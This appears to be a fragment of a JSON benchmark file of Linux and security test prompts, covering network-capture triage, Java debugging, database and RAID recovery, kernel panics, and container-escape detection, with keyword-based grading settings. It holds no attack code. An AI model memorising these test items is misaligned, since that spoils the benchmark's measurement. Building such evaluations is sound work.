      "prompt": "\nAnalyze this detailed network capture and flow data for security and performance issues:\n\n[tcpdump Summary - 10000 packets]\n10:00:00.123456 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [S], seq 1234567890\n10:00:00.123457 IP 185.234.218.15.443 > 10.0.0.5.39284: Flags [S.], seq 987654321, ack 1234567891\n10:00:00.123458 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [.], ack 1\n10:00:00.123459 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [P.], seq 1:1461, ack 1, length 1460\n... [9996 more packets]\n\n[Flow Statistics - 5000 flows]\nProto | Src IP:Port        | Dst IP:Port         | Packets | Bytes    | Duration | Flags\nTCP   | 10.0.0.5:39284    | 185.234.218.15:443 | 45823   | 52428800 | 3600s    | ESTABLISHED\nTCP   | 10.0.0.5:39285    | 192.168.1.100:22   | 234     | 23456    | 5s       | RST\nUDP   | 10.0.0.5:53       | 8.8.8.8:53         | 10000   | 500000   | 3600s    | \n... [4997 more flows]\n\n[DPI (Deep Packet Inspection) Results - 2000 identified protocols]\nHTTP/1.1:  2341 flows, 234MB transferred\nHTTPS:     5832 flows, 5.2GB transferred  \nSSH:       234 flows, 123MB transferred\nDNS:       10234 flows, 50MB transferred\nBitTorrent: 23 flows, 2.3GB transferred\nUnknown:   834 flows, 923MB transferred\n... [1994 more protocol identifications]\n\n[Anomaly Detection Results - 500 anomalies]\nType: Port Scan\n  Source: 185.234.218.15\n  Target: 10.0.0.0/24\n  Ports: 1-65535\n  Time: 10:15:00-10:16:00\n\nType: DDoS Pattern\n  Target: 10.0.0.5:80\n  Sources: 5000+ unique IPs\n  Pattern: SYN flood\n  Rate: 50000 pps\n\nType: Data Exfiltration\n  Source: 10.0.0.5\n  Destination: 185.234.218.15\n  Volume: 5GB in 5 minutes\n  Pattern: Steady stream, encrypted\n... [496 more anomalies]\n\n[Connection State Analysis]\nState         | Count  | Percentage\nESTABLISHED   | 23456  | 45%\nTIME_WAIT     | 15234  | 29%\nSYN_SENT      | 8234   | 16%\nCLOSE_WAIT    | 3456   | 7%\nFIN_WAIT1     | 1234   | 2%\nSYN_RECV      | 456    | 1%\n\n[Bandwidth Usage by Application]\nApplication | Inbound  | Outbound | Total    | Peak Rate\nWeb         | 2.3GB    | 15.6GB   | 17.9GB   | 1.2Gbps\nDatabase    | 5.4GB    | 1.2GB    | 6.6GB    | 800Mbps\nBackup      | 123MB    | 45.6GB   | 45.7GB   | 5Gbps\n... [20 more applications]\n\n[Geographic Traffic Analysis]\nCountry     | Inbound Connections | Outbound Connections | Suspicious Score\nUS          | 12345              | 23456                | Low\nCN          | 5432               | 123                  | High\nRU          | 3456               | 456                  | High\n... [50 more countries]\n\nAnalyze to:\n1. Identify ongoing attacks (DDoS, port scans, exploitation attempts)\n2. Detect data exfiltration patterns and volume\n3. Find performance bottlenecks from connection states\n4. Identify suspicious geographic patterns\n5. Detect protocol anomalies and misuse\n6. Analyze bandwidth consumption patterns\n7. Find indicators of compromised systems\n8. Identify poorly configured applications (connection leaks, etc.)\n9. Detect encrypted malicious traffic patterns\n10. Generate network security and optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this detailed network capture and flow data for security and performance issues:\n\n[tcpdump Summary - 10000 packets]\n10:00:00.123456 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [S], seq 1234567890\n10:00:00.123457 IP 185.234.218.15.443 > 10.0.0.5.39284: Flags [S.], seq 987654321, ack 1234567891\n10:00:00.123458 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [.], ack 1\n10:00:00.123459 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [P.], seq 1:1461, ack 1, length 1460\n... [9996 more packets]\n\n[Flow Statistics - 5000 flows]\nProto | Src IP:Port        | Dst IP:Port         | Packets | Bytes    | Duration | Flags\nTCP   | 10.0.0.5:39284    | 185.234.218.15:443 | 45823   | 52428800 | 3600s    | ESTABLISHED\nTCP   | 10.0.0.5:39285    | 192.168.1.100:22   | 234     | 23456    | 5s       | RST\nUDP   | 10.0.0.5:53       | 8.8.8.8:53         | 10000   | 500000   | 3600s    | \n... [4997 more flows]\n\n[DPI (Deep Packet Inspection) Results - 2000 identified protocols]\nHTTP/1.1:  2341 flows, 234MB transferred\nHTTPS:     5832 flows, 5.2GB transferred  \nSSH:       234 flows, 123MB transferred\nDNS:       10234 flows, 50MB transferred\nBitTorrent: 23 flows, 2.3GB transferred\nUnknown:   834 flows, 923MB transferred\n... [1994 more protocol identifications]\n\n[Anomaly Detection Results - 500 anomalies]\nType: Port Scan\n  Source: 185.234.218.15\n  Target: 10.0.0.0/24\n  Ports: 1-65535\n  Time: 10:15:00-10:16:00\n\nType: DDoS Pattern\n  Target: 10.0.0.5:80\n  Sources: 5000+ unique IPs\n  Pattern: SYN flood\n  Rate: 50000 pps\n\nType: Data Exfiltration\n  Source: 10.0.0.5\n  Destination: 185.234.218.15\n  Volume: 5GB in 5 minutes\n  Pattern: Steady stream, encrypted\n... [496 more anomalies]\n\n[Connection State Analysis]\nState         | Count  | Percentage\nESTABLISHED   | 23456  | 45%\nTIME_WAIT     | 15234  | 29%\nSYN_SENT      | 8234   | 16%\nCLOSE_WAIT    | 3456   | 7%\nFIN_WAIT1     | 1234   | 2%\nSYN_RECV      | 456    | 1%\n\n[Bandwidth Usage by Application]\nApplication | Inbound  | Outbound | Total    | Peak Rate\nWeb         | 2.3GB    | 15.6GB   | 17.9GB   | 1.2Gbps\nDatabase    | 5.4GB    | 1.2GB    | 6.6GB    | 800Mbps\nBackup      | 123MB    | 45.6GB   | 45.7GB   | 5Gbps\n... [20 more applications]\n\n[Geographic Traffic Analysis]\nCountry     | Inbound Connections | Outbound Connections | Suspicious Score\nUS          | 12345              | 23456                | Low\nCN          | 5432               | 123                  | High\nRU          | 3456               | 456                  | High\n... [50 more countries]\n\nAnalyze to:\n1. Identify ongoing attacks (DDoS, port scans, exploitation attempts)\n2. Detect data exfiltration patterns and volume\n3. Find performance bottlenecks from connection states\n4. Identify suspicious geographic patterns\n5. Detect protocol anomalies and misuse\n6. Analyze bandwidth consumption patterns\n7. Find indicators of compromised systems\n8. Identify poorly configured applications (connection leaks, etc.)\n9. Detect encrypted malicious traffic patterns\n10. Generate network security and optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_55",
      "name": "Test 55: Multi-Layer Application Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nAnalyze this multi-layer application debugging data to identify the root cause of intermittent failures:\n\n[Application Logs - 3000 lines with stack traces]\n2024-01-15 10:00:00.123 ERROR [RequestID: abc-123] NullPointerException in UserService.java:156\n    at com.app.service.UserService.processUser(UserService.java:156)\n    at com.app.controller.UserController.updateUser(UserController.java:89)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    ... 45 more lines of stack trace\n2024-01-15 10:00:00.456 WARN [RequestID: abc-123] Database connection pool exhausted, waiting...\n2024-01-15 10:00:05.456 ERROR [RequestID: abc-123] Timeout waiting for database connection\n... [2997 more log lines]\n\n[JVM Heap Dump Analysis Summary]\nTotal Heap: 8GB\nUsed Heap: 7.8GB\nObject Count: 45,234,567\nLargest Objects:\n  - HashMap (2.3GB) containing 5 million User objects\n  - ArrayList (1.8GB) containing cached query results\n  - byte[][] (1.2GB) appearing to be leaked image data\nLeak Suspects:\n  - com.app.cache.UserCache: Growing unbounded\n  - com.app.image.ImageProcessor: Not releasing processed images\n... [500 more lines of heap analysis]\n\n[Thread Dump - 200 threads]\n\"http-nio-8080-exec-1\" #28 daemon prio=5 os_prio=0 tid=0x00007f4a2c001000 nid=0x7f waiting for monitor entry\n   java.lang.Thread.State: BLOCKED (on object monitor)\n        at com.app.service.UserService.synchronized(UserService.java:234)\n        - waiting to lock <0x000000076ab62208> (a java.lang.Object)\n        - locked <0x000000076ab62208> (a java.lang.Object)\n        at com.app.controller.UserController.getUser(UserController.java:45)\n... [199 more thread states]\n\n[Database Profiling Data]\nQuery: SELECT * FROM users WHERE id = ?\n  Execution Count: 584,291\n  Avg Time: 1.2ms\n  Max Time: 45,234ms (during incident)\n  \nQuery: UPDATE user_sessions SET last_seen = NOW() WHERE user_id = ?\n  Execution Count: 892,734  \n  Avg Time: 0.5ms\n  Max Time: 30,123ms (during incident)\n  Lock Waits: 23,456\n... [100 more query profiles]\n\n[GC Logs Analysis]\n[GC (Allocation Failure) 7234.123: [ParNew: 1048576K->104857K(1048576K), 0.234567 secs]\n[Full GC (Ergonomics) 7456.789: [CMS: 6291456K->5242880K(7340032K), 12.345678 secs]\n[GC (CMS Final Remark) 7589.234: [Rescan (parallel), 2.345678 secs]\nGC Summary:\n  - Young GC: 5823 times, Total pause: 234.5s\n  - Full GC: 89 times, Total pause: 1098.7s\n  - Longest pause: 23.4s\n... [1000 more GC events]\n\n[System Metrics Correlation]\nTime     | CPU% | Memory% | GC% | DB Conn | Response Time | Error Rate\n10:00:00 | 45   | 60      | 5   | 50/100  | 50ms         | 0.1%\n10:00:30 | 67   | 75      | 15  | 75/100  | 200ms        | 0.5%\n10:01:00 | 89   | 85      | 35  | 95/100  | 2000ms       | 5%\n10:01:30 | 99   | 95      | 78  | 100/100 | 30000ms      | 45%\n... [120 more time points]\n\n[Network Trace Between App and DB]\n10:00:00.123 APP->DB: SELECT * FROM users WHERE id = 12345\n10:00:00.125 DB->APP: (1 row returned in 2ms)\n10:00:00.456 APP->DB: BEGIN TRANSACTION\n10:00:00.457 APP->DB: UPDATE users SET last_login = NOW() WHERE id = 12345\n10:00:30.457 APP->DB: [Connection timeout after 30s]\n10:00:30.458 APP: Opens new connection\n10:00:30.459 APP->DB: SELECT 1 (connection test)\n10:01:00.459 DB->APP: ERROR: connection limit reached\n... [5000 more network events]\n\nAnalyze to:\n1. Identify the root cause of the cascading failure\n2. Find memory leaks and their sources\n3. Detect deadlocks and lock contention issues\n4. Analyze GC impact on application performance\n5. Identify database connection pool problems\n6. Find inefficient queries causing slowdowns\n7. Detect thread pool exhaustion patterns\n8. Correlate system metrics with application behavior\n9. Identify configuration issues (pool sizes, timeouts, etc.)\n10. Generate specific code fixes and configuration changes\n",
      "messages": [
        {
          "role": "user",
          "content": "\nAnalyze this multi-layer application debugging data to identify the root cause of intermittent failures:\n\n[Application Logs - 3000 lines with stack traces]\n2024-01-15 10:00:00.123 ERROR [RequestID: abc-123] NullPointerException in UserService.java:156\n    at com.app.service.UserService.processUser(UserService.java:156)\n    at com.app.controller.UserController.updateUser(UserController.java:89)\n    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n    ... 45 more lines of stack trace\n2024-01-15 10:00:00.456 WARN [RequestID: abc-123] Database connection pool exhausted, waiting...\n2024-01-15 10:00:05.456 ERROR [RequestID: abc-123] Timeout waiting for database connection\n... [2997 more log lines]\n\n[JVM Heap Dump Analysis Summary]\nTotal Heap: 8GB\nUsed Heap: 7.8GB\nObject Count: 45,234,567\nLargest Objects:\n  - HashMap (2.3GB) containing 5 million User objects\n  - ArrayList (1.8GB) containing cached query results\n  - byte[][] (1.2GB) appearing to be leaked image data\nLeak Suspects:\n  - com.app.cache.UserCache: Growing unbounded\n  - com.app.image.ImageProcessor: Not releasing processed images\n... [500 more lines of heap analysis]\n\n[Thread Dump - 200 threads]\n\"http-nio-8080-exec-1\" #28 daemon prio=5 os_prio=0 tid=0x00007f4a2c001000 nid=0x7f waiting for monitor entry\n   java.lang.Thread.State: BLOCKED (on object monitor)\n        at com.app.service.UserService.synchronized(UserService.java:234)\n        - waiting to lock <0x000000076ab62208> (a java.lang.Object)\n        - locked <0x000000076ab62208> (a java.lang.Object)\n        at com.app.controller.UserController.getUser(UserController.java:45)\n... [199 more thread states]\n\n[Database Profiling Data]\nQuery: SELECT * FROM users WHERE id = ?\n  Execution Count: 584,291\n  Avg Time: 1.2ms\n  Max Time: 45,234ms (during incident)\n  \nQuery: UPDATE user_sessions SET last_seen = NOW() WHERE user_id = ?\n  Execution Count: 892,734  \n  Avg Time: 0.5ms\n  Max Time: 30,123ms (during incident)\n  Lock Waits: 23,456\n... [100 more query profiles]\n\n[GC Logs Analysis]\n[GC (Allocation Failure) 7234.123: [ParNew: 1048576K->104857K(1048576K), 0.234567 secs]\n[Full GC (Ergonomics) 7456.789: [CMS: 6291456K->5242880K(7340032K), 12.345678 secs]\n[GC (CMS Final Remark) 7589.234: [Rescan (parallel), 2.345678 secs]\nGC Summary:\n  - Young GC: 5823 times, Total pause: 234.5s\n  - Full GC: 89 times, Total pause: 1098.7s\n  - Longest pause: 23.4s\n... [1000 more GC events]\n\n[System Metrics Correlation]\nTime     | CPU% | Memory% | GC% | DB Conn | Response Time | Error Rate\n10:00:00 | 45   | 60      | 5   | 50/100  | 50ms         | 0.1%\n10:00:30 | 67   | 75      | 15  | 75/100  | 200ms        | 0.5%\n10:01:00 | 89   | 85      | 35  | 95/100  | 2000ms       | 5%\n10:01:30 | 99   | 95      | 78  | 100/100 | 30000ms      | 45%\n... [120 more time points]\n\n[Network Trace Between App and DB]\n10:00:00.123 APP->DB: SELECT * FROM users WHERE id = 12345\n10:00:00.125 DB->APP: (1 row returned in 2ms)\n10:00:00.456 APP->DB: BEGIN TRANSACTION\n10:00:00.457 APP->DB: UPDATE users SET last_login = NOW() WHERE id = 12345\n10:00:30.457 APP->DB: [Connection timeout after 30s]\n10:00:30.458 APP: Opens new connection\n10:00:30.459 APP->DB: SELECT 1 (connection test)\n10:01:00.459 DB->APP: ERROR: connection limit reached\n... [5000 more network events]\n\nAnalyze to:\n1. Identify the root cause of the cascading failure\n2. Find memory leaks and their sources\n3. Detect deadlocks and lock contention issues\n4. Analyze GC impact on application performance\n5. Identify database connection pool problems\n6. Find inefficient queries causing slowdowns\n7. Detect thread pool exhaustion patterns\n8. Correlate system metrics with application behavior\n9. Identify configuration issues (pool sizes, timeouts, etc.)\n10. Generate specific code fixes and configuration changes\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_56",
      "name": "Test 56: Production Database Corruption Recovery",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nA production PostgreSQL database has corruption after a power failure. Write a recovery script that:\n1. Checks pg_control for the last checkpoint location using pg_controldata\n2. Analyzes WAL files in pg_wal to find the last consistent state\n3. Uses pg_resetwal carefully with calculated values for transaction ID, OID, and multitransaction ID\n4. Implements a page-level corruption check using pg_checksums\n5. Extracts salvageable data from corrupted tables using pageinspect extension\n6. Rebuilds corrupted indexes after identifying them with bt_index_check()\n7. Validates referential integrity after recovery using foreign key checks\n8. Creates a recovery report documenting data loss and recovery actions\nInclude safety checks to prevent data loss and detailed logging of each step.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nA production PostgreSQL database has corruption after a power failure. Write a recovery script that:\n1. Checks pg_control for the last checkpoint location using pg_controldata\n2. Analyzes WAL files in pg_wal to find the last consistent state\n3. Uses pg_resetwal carefully with calculated values for transaction ID, OID, and multitransaction ID\n4. Implements a page-level corruption check using pg_checksums\n5. Extracts salvageable data from corrupted tables using pageinspect extension\n6. Rebuilds corrupted indexes after identifying them with bt_index_check()\n7. Validates referential integrity after recovery using foreign key checks\n8. Creates a recovery report documenting data loss and recovery actions\nInclude safety checks to prevent data loss and detailed logging of each step.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_57",
      "name": "Test 57: Kernel Panic Root Cause Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a kernel panic analysis toolkit that:\n1. Parses kdump/crash dumps to extract panic information\n2. Analyzes the call stack to identify the faulting module and function\n3. Decodes kernel symbols and inline functions from vmlinux\n4. Checks for known hardware issues based on MCE (Machine Check Exception) logs\n5. Analyzes kernel taint flags and their implications\n6. Searches for similar panics in kernel bugzilla and LKML\n7. Generates a disassembly of the faulting code section\n8. Checks for race conditions based on CPU and lock states\n9. Analyzes memory corruption patterns if present\n10. Produces a detailed report with debugging recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a kernel panic analysis toolkit that:\n1. Parses kdump/crash dumps to extract panic information\n2. Analyzes the call stack to identify the faulting module and function\n3. Decodes kernel symbols and inline functions from vmlinux\n4. Checks for known hardware issues based on MCE (Machine Check Exception) logs\n5. Analyzes kernel taint flags and their implications\n6. Searches for similar panics in kernel bugzilla and LKML\n7. Generates a disassembly of the faulting code section\n8. Checks for race conditions based on CPU and lock states\n9. Analyzes memory corruption patterns if present\n10. Produces a detailed report with debugging recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_58",
      "name": "Test 58: Distributed System Split-Brain Resolution",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDesign a split-brain detection and resolution system for a distributed database cluster:\n1. Implement a quorum-based node health checker using multiple communication channels\n2. Detect network partitions using both heartbeat and application-level checks\n3. Implement a STONITH (Shoot The Other Node In The Head) mechanism safely\n4. Create a data reconciliation process for diverged replicas\n5. Track and resolve conflicting writes using vector clocks\n6. Implement automatic failover with data consistency guarantees\n7. Create a partition history tracker to prevent repeated split-brains\n8. Design a manual override system for operator intervention\n9. Generate detailed logs of all decisions for post-mortem analysis\nInclude safeguards against data loss and cascading failures.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDesign a split-brain detection and resolution system for a distributed database cluster:\n1. Implement a quorum-based node health checker using multiple communication channels\n2. Detect network partitions using both heartbeat and application-level checks\n3. Implement a STONITH (Shoot The Other Node In The Head) mechanism safely\n4. Create a data reconciliation process for diverged replicas\n5. Track and resolve conflicting writes using vector clocks\n6. Implement automatic failover with data consistency guarantees\n7. Create a partition history tracker to prevent repeated split-brains\n8. Design a manual override system for operator intervention\n9. Generate detailed logs of all decisions for post-mortem analysis\nInclude safeguards against data loss and cascading failures.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_59",
      "name": "Test 59: Performance Regression Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild an automated performance regression detection system:\n1. Collect baseline performance metrics using perf, eBPF, and application metrics\n2. Implement statistical analysis to detect significant deviations (t-test, z-score)\n3. Correlate regressions with system changes (kernel updates, deployments, config changes)\n4. Use flame graphs to compare CPU usage patterns between versions\n5. Analyze memory allocation patterns for increased pressure\n6. Track syscall latency changes using ftrace\n7. Monitor network stack performance changes\n8. Implement automatic bisection to find the commit causing regression\n9. Generate detailed comparison reports with specific bottleneck identification\n10. Create rollback recommendations based on severity\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild an automated performance regression detection system:\n1. Collect baseline performance metrics using perf, eBPF, and application metrics\n2. Implement statistical analysis to detect significant deviations (t-test, z-score)\n3. Correlate regressions with system changes (kernel updates, deployments, config changes)\n4. Use flame graphs to compare CPU usage patterns between versions\n5. Analyze memory allocation patterns for increased pressure\n6. Track syscall latency changes using ftrace\n7. Monitor network stack performance changes\n8. Implement automatic bisection to find the commit causing regression\n9. Generate detailed comparison reports with specific bottleneck identification\n10. Create rollback recommendations based on severity\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_60",
      "name": "Test 60: Storage Array Failure Recovery",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nHandle a critical storage array failure scenario:\n1. Detect failed drives in RAID arrays using mdadm and hardware RAID tools\n2. Assess data integrity across remaining drives using checksums\n3. Implement emergency read-only mode to prevent further corruption\n4. Create a priority-based data recovery plan based on business impact\n5. Use ddrescue to recover data from failing drives with bad sectors\n6. Rebuild RAID arrays with optimal stripe size for recovery performance\n7. Implement continuous backup during recovery to prevent data loss\n8. Monitor array rebuild progress and estimate completion time\n9. Validate recovered data integrity using application-level checks\n10. Create a post-mortem report with failure analysis and prevention recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nHandle a critical storage array failure scenario:\n1. Detect failed drives in RAID arrays using mdadm and hardware RAID tools\n2. Assess data integrity across remaining drives using checksums\n3. Implement emergency read-only mode to prevent further corruption\n4. Create a priority-based data recovery plan based on business impact\n5. Use ddrescue to recover data from failing drives with bad sectors\n6. Rebuild RAID arrays with optimal stripe size for recovery performance\n7. Implement continuous backup during recovery to prevent data loss\n8. Monitor array rebuild progress and estimate completion time\n9. Validate recovered data integrity using application-level checks\n10. Create a post-mortem report with failure analysis and prevention recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_61",
      "name": "Test 61: Memory Leak Detection in Production",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a production-safe memory leak detection and analysis system:\n1. Use process_vm_readv to read process memory without attaching\n2. Track heap growth patterns over time using /proc/PID/status\n3. Analyze malloc patterns using LD_PRELOAD interception\n4. Identify leaked objects using conservative garbage collection scanning\n5. Generate heap allocation flame graphs for visualization\n6. Correlate memory growth with application events and requests\n7. Implement automatic heap dumping when thresholds are exceeded\n8. Analyze core dumps for memory leak patterns without stopping the process\n9. Track native memory leaks in JNI or other FFI code\n10. Generate actionable reports with specific allocation sites\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a production-safe memory leak detection and analysis system:\n1. Use process_vm_readv to read process memory without attaching\n2. Track heap growth patterns over time using /proc/PID/status\n3. Analyze malloc patterns using LD_PRELOAD interception\n4. Identify leaked objects using conservative garbage collection scanning\n5. Generate heap allocation flame graphs for visualization\n6. Correlate memory growth with application events and requests\n7. Implement automatic heap dumping when thresholds are exceeded\n8. Analyze core dumps for memory leak patterns without stopping the process\n9. Track native memory leaks in JNI or other FFI code\n10. Generate actionable reports with specific allocation sites\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_62",
      "name": "Test 62: Network Congestion Diagnosis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nBuild a comprehensive network congestion diagnostic tool:\n1. Monitor TCP retransmission rates and patterns per connection\n2. Analyze packet capture for congestion indicators (ECN, window scaling)\n3. Track buffer bloat symptoms using ping RTT variance\n4. Measure actual vs advertised bandwidth using various algorithms\n5. Identify congestion sources: local, ISP, or remote\n6. Analyze traffic shaping and QoS policy effectiveness\n7. Detect and quantify packet loss patterns (random vs burst)\n8. Monitor TCP congestion window evolution\n9. Identify optimal TCP congestion control algorithm for workload\n10. Generate network optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive network congestion diagnostic tool:\n1. Monitor TCP retransmission rates and patterns per connection\n2. Analyze packet capture for congestion indicators (ECN, window scaling)\n3. Track buffer bloat symptoms using ping RTT variance\n4. Measure actual vs advertised bandwidth using various algorithms\n5. Identify congestion sources: local, ISP, or remote\n6. Analyze traffic shaping and QoS policy effectiveness\n7. Detect and quantify packet loss patterns (random vs burst)\n8. Monitor TCP congestion window evolution\n9. Identify optimal TCP congestion control algorithm for workload\n10. Generate network optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_63",
      "name": "Test 63: Container Escape Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nImplement a container escape detection and prevention system:\n1. Monitor /proc/*/root symlinks for container boundary violations\n2. Track capability usage and detect suspicious capability requests\n3. Monitor namespace changes using inotify on /proc/*/ns/\n4. Detect privileged container indicators and runtime changes\n5. Track mount operations that could lead to host filesystem access\n6. Monitor kernel module loading attempts from containers\n7. Detect ptrace usage that could indicate escape attempts\n8. Track cgroup escape attempts through release_agent\n9. Monitor for known container escape exploits (CVE patterns)\n10. Implement real-time alerting and automatic container termination\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement a container escape detection and prevention system:\n1. Monitor /proc/*/root symlinks for container boundary violations\n2. Track capability usage and detect suspicious capability requests\n3. Monitor namespace changes using inotify on /proc/*/ns/\n4. Detect privileged container indicators and runtime changes\n5. Track mount operations that could lead to host filesystem access\n6. Monitor kernel module loading attempts from containers\n7. Detect ptrace usage that could indicate escape attempts\n8. Track cgroup escape attempts through release_agent\n9. Monitor for known container escape exploits (CVE patterns)\n10. Implement real-time alerting and automatic container termination\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_64",
      "name": "Test 64: Elasticsearch Cluster Recovery",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
